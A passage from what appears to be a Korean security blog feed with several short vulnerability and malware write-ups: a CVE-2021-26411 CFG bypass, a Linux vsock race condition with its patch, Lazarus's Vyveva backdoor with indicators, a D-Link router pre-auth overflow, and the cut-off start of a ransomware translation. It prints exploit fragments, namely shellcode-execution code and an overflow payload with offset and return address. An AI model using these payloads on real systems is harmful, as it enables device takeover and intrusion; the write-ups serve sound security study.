&#xAEBC;&#xC838;&#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xAC00;&#xC9DC; RPC_MESSAGE&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;(&#xBC84;&#xD37C;&#xC5D0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD568;&#xC218;) &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0D8;&#xD50C;&#xC740; mis.dll+0x5000&#xC5D0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; rpcrt4!NdrServerCall2&#xB97C; &#xD1B5;&#xD574; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">var shellcode = <span class="hljs-keyword">new</span> Uint8Array([<span class="hljs-number">0xcc</span>])var msi = call2(LoadLibraryExA, [newStr(&apos;msi.dll&apos;), 0, 1]) + 0x5000var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)call2(VirtualProtect, [msi, shellcode.length, <span class="hljs-number">0x4</span>, tmpBuffer])writeData(msi, shellcode)call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])call2(msi, [])</code></pre><p>&#xB2E4;&#xC74C;&#xC740; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC131;&#xACF5;&#xD55C; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/10.png" alt></p><h1 id="Some-thoughts"><a href="#Some-thoughts" class="headerlink" title="Some thoughts"></a>Some thoughts</h1><p>&#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; CVE-2021-26411 &#xC0D8;&#xD50C;&#xC740; CFG &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xC220;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAE30;&#xBC95;&#xC740; ROP&#xC5D0; &#xC758;&#xC874;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB418;&#xBA70; RPC_MESSAGE&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(Arbitrary Code Execution)&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC04;&#xACB0;&#xD558;&#xACE0; &#xC2E0;&#xB8B0;&#xB3C4;(&#xC131;&#xACF5;&#xB960;)&#xAC00; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; CFG &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD1B5;&#xC6A9;&#xB420; &#xAC83;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard</a></p><p>[2] <a href="https://windows-internals.com/cet-on-windows/">https://windows-internals.com/cet-on-windows/</a></p><p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>cfg</tag>
      
      <tag>rpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26708: Linux 커널 가상 소켓 라이브러리의 Race Condition 취약점</title>
    <link href="/2021/04/13/l0ch/2021-04-13/"/>
    <url>/2021/04/13/l0ch/2021-04-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: exploiting CVE-2021-26708 in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zer0con 2021&#xC5D0;&#xC11C; Linux &#xCEE4;&#xB110;&#xC758; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xACFC; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD55C; &#xC18C;&#xCF13; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC778; virtual socket library&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC73C;&#xBA70; <code>net/vmw_vsock/af_vsock.c</code> &#xC758; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xB4E4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>vsock_poll()</code></li><li><code>vsock_dgram_sendmsg()</code></li><li><code>vsock_stream_setsockopt()</code></li><li><code>vsock_stream_sendmsg()</code></li><li><code>vsock_stream_recvmsg()</code></li></ul><p>&#xC774; &#xC911; <code>vsock_stream_setsockopt()</code> &#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vsock_stream_setsockopt</span><span class="hljs-params">(struct socket *sock,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> level,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> optname,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">sockptr_t</span> optval,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> optlen)</span></span><span class="hljs-function"><span class="hljs-comment">/* ... */</span></span><span class="hljs-function">struct sock *sk</span>;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_sock</span> *<span class="hljs-title">vsk</span>;</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_transport</span> *<span class="hljs-title">transport</span>;</span><span class="hljs-comment">/* ... */</span>sk = sock-&gt;sk;vsk = vsock_sk(sk);transport = vsk-&gt;transport;lock_sock(sk);</code></pre><p>&#xAC00;&#xC0C1; &#xC18C;&#xCF13; &#xC804;&#xC1A1; &#xD3EC;&#xC778;&#xD130;&#xC778; <code>vsk&#x2192;transport</code>&#xB294; &#xB85C;&#xCEEC; &#xBCC0;&#xC218;&#xC778; <code>transport</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xB370;, &#xB85C;&#xCEEC; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xC774;&#xD6C4; &#xC18C;&#xCF13; <code>sk</code>&#xC5D0; &#xB300;&#xD55C; lock&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xBBC0;&#xB85C; <code>vsk&#x2192;transport</code>&#xC758; &#xAC12;&#xC774; &#xBCC0;&#xACBD;&#xB420; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB294; race condition&#xC744; &#xD1B5;&#xD574; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xBCF4;&#xC790;&#xB294; 5&#xAC1C;&#xC758; &#xD568;&#xC218;&#xC5D0;&#xC11C; race condition&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC73C;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC18C;&#xCF13; <code>sk</code>&#xC5D0; &#xB300;&#xD55C; lock&#xC744; &#xD68D;&#xB4DD;&#xD55C; &#xC774;&#xD6C4; &#xB85C;&#xCEEC; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">sk = sock-&gt;sk;vsk = vsock_sk(sk);-transport = vsk-&gt;transport;  lock_sock(sk); +transport = vsk-&gt;transport;</code></pre><p>Github&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xC790;&#xC138;&#xD55C; &#xD328;&#xCE58; &#xD788;&#xC2A4;&#xD1A0;&#xB9AC;&#xB294; <a href="https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446">https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 화물 물류 회사 공격에 사용된 라자루스 그룹의 백도어 Vyveva</title>
    <link href="/2021/04/12/idioth/2021-04-12/"/>
    <url>/2021/04/12/idioth/2021-04-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/">(Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESET&#xC5D0;&#xC11C; &#xB77C;&#xC790;&#xB8E8;&#xC2A4; &#xADF8;&#xB8F9;&#xC774; &#xB0A8;&#xC544;&#xD504;&#xB9AC;&#xCE74; &#xD654;&#xBB3C; &#xBB3C;&#xB958; &#xD68C;&#xC0AC;&#xB97C; &#xACF5;&#xACA9;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C; &#xBC31;&#xB3C4;&#xC5B4; Vyveva&#xB97C; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC31;&#xB3C4;&#xC5B4;&#xB294; &#xB9CE;&#xC740; &#xAE30;&#xB2A5;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xD1A0;&#xB974; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xD1B5;&#xD574; C&amp;C &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Vyveva&#xB294; &#xC774;&#xC804; &#xB77C;&#xC790;&#xB8E8;&#xC2A4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; NukeSped &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C; fake TLS &#xC0AC;&#xC6A9;, command line execution chains, &#xC554;&#xD638;&#xD654; &#xBC0F; &#xD1A0;&#xB974; &#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC6A9; &#xB4F1;&#xC744; &#xBBF8;&#xB8E8;&#xC5B4;&#xBCF4;&#xC544; &#xB77C;&#xC790;&#xB8E8;&#xC2A4;&#xC758; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Vyveva&#xB294; &#xC778;&#xC2A4;&#xD1A8;&#xB7EC;, &#xB85C;&#xB354;, &#xBC31;&#xB3C4;&#xC5B4; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xC2A4;&#xD1A8;&#xB7EC;&#xB294; &#xBC31;&#xB3C4;&#xC5B4; &#xB85C;&#xB354;&#xC758; &#xC720;&#xC9C0;&#xB97C; &#xC704;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB0B4;&#xC7A5;&#xB41C; &#xBC31;&#xB3C4;&#xC5B4; &#xC124;&#xC815;&#xC744; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC704;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC11C;&#xBE44;&#xC2A4; &#xC774;&#xB984;&#xACFC; &#xD45C;&#xC2DC;&#xB418;&#xB294; &#xC774;&#xB984;&#xC740; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xB2E8;&#xC5B4;&#xB97C; &#xC870;&#xD569;&#xD558;&#xC5EC; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; infection ID&#xB97C; &#xBB34;&#xC791;&#xC704; &#xAC12;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[HKLM\SOFTWARE\Microsoft\DirectX]</span><span class="hljs-attr">UsageMask</span> = &lt;CONFIG_DATA&gt;</code></pre><p>Vyveva&#xC758; &#xBA54;&#xC778;&#xC778; &#xBC31;&#xB3C4;&#xC5B4;&#xB294; C&amp;C &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. 23&#xAC1C;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA70;, &#xC77C;&#xBD80;&#xB294; &#xBE44;&#xB3D9;&#xAE30;&#xC2DD;&#xC73C;&#xB85C; &#xC790;&#xCCB4; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xD30C;&#xC77C; &#xBC0F; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC791;&#xC5C5;&#xC774;&#xB098; &#xC815;&#xBCF4; &#xC218;&#xC9D1;&#xC744; &#xC704;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xC9C0;&#xB9CC; &#xD30C;&#xC77C; <a href="https://attack.mitre.org/versions/v8/techniques/T1070/006/">timestomping</a>&#xC744; &#xC704;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xBC31;&#xB3C4;&#xC5B4;&#xB294; &#xC0C8;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xAC70;&#xB098; &#xC5F0;&#xACB0;&#xC774; &#xB04A;&#xC5B4;&#xC9C4; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xB97C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xBA70; &#xB85C;&#xADF8;&#xC628;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xC218;&#xB97C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xC138;&#xC158; &#xAC10;&#xC2DC; &#xAE30;&#xB2A5; &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C8; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xB098; &#xC138;&#xC158; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xAE30;&#xC874; &#xC124;&#xC815;&#xB41C; &#xAC04;&#xACA9;&#xC744; &#xBB34;&#xC2DC;&#xD558;&#xACE0; C&amp;C &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC;&#xB41C; Vyveva&#xC758; &#xC0D8;&#xD50C;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>SHA-1</th><th>Filename</th><th>Description</th></tr></thead><tbody><tr><td>DAD50AD3682A3F20B2F35BE2A94B89E2B1A73067</td><td>powerctl.exe</td><td>Installer</td></tr><tr><td>69529EED679B0C7F1ACC1FD782A4B443CEC0CF83</td><td>powerctl.dll</td><td>Loader (x86)</td></tr><tr><td>043ADDFB93A10D187DDE4999D78096077F26E9FD</td><td>wwanauth.dll</td><td>Loader (x64)</td></tr><tr><td>1E3785FC4FE5AB8DAB31DDDD68257F9A7FC5BF59</td><td>wwansec.dll</td><td>Loader (x86)</td></tr><tr><td>4D7ADD8145CB096359EBC3E4D44E19C2735E0377</td><td>msobjs.drx</td><td>Backdoor (ecnrypted)</td></tr><tr><td>92F5469DBEFDCEE1343934BE149AFC1241CC8497</td><td>msobjs.drx</td><td>Backdoor (dencrypted with fixed MZ header)</td></tr><tr><td>A5CE1DF767C89BF29D40DC4FA6EAECC9C8979552</td><td>JET76C5.tmp</td><td>Bacckdoor Tor library (encrypted)</td></tr><tr><td>66D17344A7CE55D05A324E1C6BE2ECD817E72680</td><td>JET76C5.tmp</td><td>Backdoor Tor library (dencrypted with fixed MZ header)</td></tr></tbody></table></div>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backdoor</tag>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>lazarus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow</title>
    <link href="/2021/04/11/insu/2021-04-11/"/>
    <url>/2021/04/11/insu/2021-04-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162133/CVE-2021-26709_advisory.txt">D-Link DSL-320B-D1 Pre-Authentication Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DSL-320B-D1, EU_1.25 and lower</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL &#xBAA8;&#xB380;, DSL-320b-D1, EU_1.25 &#xC774;&#xD558;&#xC758; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>login.xgi</code>&#xC5D0;&#xC11C; <code>user</code>&#xC640; <code>pass</code> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span><span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre><p><code>user</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span><span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET<span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)<span class="hljs-attribute">payload</span> += shellcode</code></pre><p>&#xBC18;&#xBA74;&#xC5D0; <code>pass</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; 641&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; GET request&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBA70; ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>bof</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 1</title>
    <link href="/2021/04/11/idioth/arch_of_ransomware_part1/"/>
    <url>/2021/04/11/idioth/arch_of_ransomware_part1/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xD558;&#xB098; &#xB4E4;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC; ghidra &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xC9C4;&#xD589; + &#xD559;&#xAD50; &#xACFC;&#xC81C; + &#xADF8; &#xC678;&#xC758; &#xAC1C;&#xC778; &#xC0AC;&#xC815;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBCF4;&#xB824;&#xACE0; &#xD588;&#xB358; &#xAE00;&#xC744; &#xC880; &#xBBF8;&#xB904;&#xB194;&#xC11C; &#xC880; &#xC81C; &#xC790;&#xC2E0;&#xC744; &#xD658;&#xAE30;&#xC2DC;&#xD0AC; &#xACB8; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xBC88;&#xC5ED;&#xC744; &#xCAD9;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC720;&#xD589;&#xC774;&#xB77C;&#xACE0; &#xD574;&#xC57C; &#xD558;&#xB098; &#xBCF4;&#xC548; &#xD544;&#xB4DC;&#xC758; &#xC0AC;&#xB78C;&#xB4E4; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xC0AC;&#xB78C;&#xD55C;&#xD14C;&#xB3C4; &#xB9CE;&#xC774; &#xC775;&#xC219;&#xD574;&#xC9C4; &#xC9C0;&#xB294; &#xAF64; &#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xBC1C;&#xC804;&#xD558;&#xACE0; &#xC788;&#xC8E0;! &#xD30C;&#xD2B8; 1 &#xBD80;&#xBD84;&#xC740; &#xB108;&#xBB34; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC57C;&#xAE30;&#xAC00; &#xC8FC;&#xB97C; &#xC774;&#xB8E8;&#xB2C8; &#xAC00;&#xBCBC;&#xC6B4; &#xB9C8;&#xC74C;&#xC73C;&#xB85C;(?) &#xC77D;&#xC5B4;&#xC8FC;&#xC2DC;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xBC88;&#xC5ED;&#xAE00;&#xC740; &#xB298;&#x2026;&#x314E;&#x314E; &#xC758;&#xC5ED;&#xACFC; &#xC624;&#xC5ED;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC798;&#xBABB;&#xB41C; &#xBD80;&#xBD84;&#xC740; &#xC9C0;&#xC801;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><hr><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-1-2-1b9fee757fcb">Architecture of a ransomware (1/2)</a></p></blockquote><p>COVID-19&#xB85C; &#xC778;&#xD574; &#xC6D0;&#xACA9; &#xC5C5;&#xBB34;&#xAC00; &#xC99D;&#xAC00;&#xD568;&#xC5D0; &#xB530;&#xB77C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC0AC;&#xAC74;&#xC774; &#xC99D;&#xAC00;&#xD558;&#xACE0; &#xC788;&#xB2E4;. &#xBAA8;&#xB4E0; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xACF5;&#xACA9;&#xC5D0; &#xB354; &#xB098;&#xC740; &#xB300;&#xC751;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; 